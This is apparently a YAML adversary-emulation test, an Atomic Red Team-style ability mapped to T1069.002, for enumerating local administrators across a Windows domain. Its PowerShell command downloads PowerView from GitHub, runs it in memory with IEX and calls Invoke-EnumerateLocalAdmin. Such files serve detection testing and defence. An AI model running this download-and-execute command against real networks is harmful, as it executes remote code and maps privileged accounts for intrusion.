- id: e86dc991-7f1d-536a-a430-d7429a0ae68f
  name: Soumaia ART Tests - Find local admins on all machines in domain (PowerView)
  description: Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.
  tactic: discovery
  technique:
    attack_id: T1069.002
    name: 'Permission Groups Discovery: Domain Groups'
  platforms:
    windows:
      psh:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
